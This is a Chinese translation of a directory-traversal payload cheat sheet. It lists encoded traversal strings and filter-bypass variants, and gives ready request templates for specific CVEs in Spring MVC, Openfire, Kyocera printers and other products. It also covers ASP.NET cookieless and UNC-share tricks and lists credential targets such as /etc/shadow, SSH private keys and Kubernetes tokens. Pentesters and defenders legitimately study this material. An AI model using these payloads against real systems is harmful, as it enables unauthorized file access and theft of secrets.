[原文文档](README.en.md)

# 目录遍历

> 路径遍历，也称为目录遍历，是一种安全漏洞，当攻击者操纵引用文件的变量使用"点-点-斜杠（../）"序列或类似结构时会发生这种漏洞。这可能允许攻击者访问存储在文件系统上的任意文件和目录。

## 摘要

* [工具](#tools)
* [方法论](#methodology)
    * [URL 编码](#url-encoding)
    * [双重 URL 编码](#double-url-encoding)
    * [Unicode 编码](#unicode-encoding)
    * [过长 UTF-8 Unicode 编码](#overlong-utf-8-unicode-encoding)
    * [混淆路径](#mangled-path)
    * [空字节](#null-bytes)
    * [反向代理 URL 实现](#reverse-proxy-url-implementation)
* [利用](#exploit)
    * [UNC 共享](#unc-share)
    * [ASP NET 无 Cookie](#asp-net-cookieless)
    * [IIS 短名称](#iis-short-name)
    * [Java URL 协议](#java-url-protocol)
* [路径遍历](#path-traversal)
    * [Linux 文件](#linux-files)
    * [Windows 文件](#windows-files)
* [实验环境](#labs)
* [参考资料](#references)

## 工具

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - 目录遍历模糊测试器

    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## 方法论

我们可以使用 `..` 字符访问父目录，以下字符串是几种编码，可以帮助您绕过实现不佳的过滤器。

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### URL 编码

| 字符 | 编码 |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

**示例：** IPConfigure Orchid Core VMS 2.0.5 - 本地文件包含

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### 双重 URL 编码

双重 URL 编码是对字符串应用两次 URL 编码的过程。在 URL 编码中，特殊字符被替换为 % 跟其十六进制 ASCII 值。双重编码对已编码的字符串重复此过程。

| 字符 | 编码 |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

**示例：** Spring MVC 目录遍历漏洞 (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Unicode 编码

| 字符 | 编码 |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |

**示例**: Openfire 管理控制台 - 身份验证绕过 (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### 过长 UTF-8 Unicode 编码

UTF-8 标准规定每个代码点使用表示其有效位所需的最少字节数进行编码。任何使用超过所需字节数的编码都被称为"过长"，在 UTF-8 规范下被认为是无效的。此规则确保代码点与其有效编码之间的一对一映射，保证每个代码点都有单一、唯一的表示。

| 字符 | 编码 |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |

### 混淆路径

有时您会遇到从字符串中删除 `../` 字符的 WAF，只需复制它们。

```powershell
..././
...\.\
```

**示例:**: Mirasys DVMS 工作站 <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### 空字节

空字节（`%00`），也称为空字符，是许多编程语言和系统中的特殊控制字符（0x00）。它通常在 C 和 C++ 等语言中用作字符串终止符。在目录遍历攻击中，空字节用于操作或绕过服务器端输入验证机制。

**示例:** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**示例:** Kyocera 打印机 d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### 反向代理 URL 实现

Nginx 将 `/..;/` 视为目录，而 Tomcat 将其视为 `/../`，这允许我们访问任意 servlet。

```powershell
..;/
```

**示例**: Pascom 云电话系统 CVE-2021-45967

NGINX 和后端 Tomcat 服务器之间的配置错误导致 Tomcat 服务器中的路径遍历，暴露了意外端点。

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```

## 利用

这些利用影响与特定技术相关的机制。

### UNC 共享

UNC（通用命名约定）共享是一种标准格式，用于以独立于平台的方式指定网络上资源（如共享文件、目录或设备）的位置。它常用于 Windows 环境，但也受其他操作系统支持。

攻击者可以将 **Windows** UNC 共享（`\\UNC\share\name`）注入到软件系统中，以潜在地将访问重定向到意外位置或任意文件。

```powershell
\\localhost\c$\windows\win.ini
```

此外机器也可能在此远程共享上进行身份验证，从而发送 NTLM 交换。

### ASP NET 无 Cookie

当启用无 Cookie 会话状态时。ASP.NET 依赖于 Cookie 来标识会话，而是通过将会话 ID 直接嵌入 URL 来修改 URL。

例如，典型的 URL 可能从：`http://example.com/page.aspx` 转换为类似：`http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx` 的内容。`(S(...))` 内的值是会话 ID。

| .NET 版本   | URI                        |
| -------------- | -------------------------- |
| V1.0, V1.1     | /(XXXXXXXX)/               |
| V2.0+          | /(S(XXXXXXXX))/            |
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+          | ...                        |

我们可以使用此行为来绕过过滤的 URL。

* 如果您的应用程序在主文件夹中

    ```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

* 如果您的应用程序在子文件夹中

    ```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```

| CVE            | 载荷                                        |
| -------------- | ---------------------------------------------- |
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |
| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |

### IIS 短名称

IIS 短名称漏洞利用了微软 Internet 信息服务 (IIS) Web 服务器的一个怪癖，允许攻击者确定 Web 服务器上具有超过 8.3 格式（也称为短文件名）的名称的文件或目录的存在。

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

    ```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ```

* [bitquark/shortscan](https://github.com/bitquark/shortscan)

    ```ps1
    shortscan http://example.org/
    ```

### Java URL 协议

当使用 `new URL('')` 时，Java 的 URL 协议允许格式 `url:URL`

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## 路径遍历

### Linux 文件

* 操作系统和信息

    ```powershell
    /etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
    ```

* 进程

    ```ps1
    /proc/[0-9]*/fd/[0-9]*   # 第一个数字是 PID，第二个是文件描述符
    /proc/self/environ
    /proc/version
    /proc/cmdline
    /proc/sched_debug
    /proc/mounts
    ```

* 网络

    ```ps1
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
    ```

* 当前路径

    ```ps1
    /proc/self/cwd/index.php
    /proc/self/cwd/main.py
    ```

* 索引

    ```ps1
    /var/lib/mlocate/mlocate.db
    /var/lib/plocate/plocate.db
    /var/lib/mlocate.db
    ```

* 凭据和历史

    ```ps1
    /etc/passwd
    /etc/shadow
    /home/$USER/.bash_history
    /home/$USER/.ssh/id_rsa
    /etc/mysql/my.cnf
    ```

* Kubernetes

    ```ps1
    /run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/namespace
    /run/secrets/kubernetes.io/serviceaccount/certificate
    /var/run/secrets/kubernetes.io/serviceaccount
    ```

### Windows 文件

文件 `license.rtf` 和 `win.ini` 在现代 Windows 系统中始终存在，使它们成为测试路径遍历漏洞的可靠目标。虽然它们的内容不是特别敏感或有趣，但它们很好地用作概念证明。

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

在 Microsoft Windows 操作系统上可以读取任意文件时要探测的文件/路径列表：[soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```

## 实验环境

* [PortSwigger - 文件路径遍历，简单案例](https://portswigger.net/web-security/file-path-traversal/lab-simple)
* [PortSwigger - 文件路径遍历，使用绝对路径绕过阻止遍历序列](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
* [PortSwigger - 文件路径遍历，非递归移除遍历序列](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
* [PortSwigger - 文件路径遍历，使用冗余 URL 解码移除遍历序列](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
* [PortSwigger - 文件路径遍历，路径开始验证](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
* [PortSwigger - 文件路径遍历，使用空字节绕过验证文件扩展名](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

## 参考资料

* [无 Cookie ASPNET - Soroush Dalili - 2023年3月27日](https://twitter.com/irsdl/status/1640390106312835072)
* [CWE-40: 路径遍历：'\\UNC\share\name\' (Windows UNC 共享) - CWE Mitre - 2018年12月27日](https://cwe.mitre.org/data/definitions/40.html)
* [目录遍历 - Portswigger - 2019年3月30日](https://portswigger.net/web-security/file-path-traversal)
* [目录遍历攻击 - Wikipedia - 2024年8月5日](https://en.wikipedia.org/wiki/Directory_traversal_attack)
* [EP 057 | Proc 文件系统技巧和 locatedb 滥用 @_remsio_ & @_bluesheet - TheLaluka - 2023年11月30日](https://youtu.be/YlZGJ28By8U)
* [利用 Microsoft Windows 操作系统上的盲文件读取/路径遍历漏洞 - @evisneffos - 2018年6月19日](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
* [NGINX 可能在您不知情的情况下保护您的应用程序免受遍历攻击 - Rotem Bar - 2020年9月24日](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
* [路径遍历备忘单：Windows - @HollyGraceful - 2015年5月17日](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
* [了解 ASP.NET 无 Cookie 功能的工作原理 - Microsoft 文档 - 2011年6月24日](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))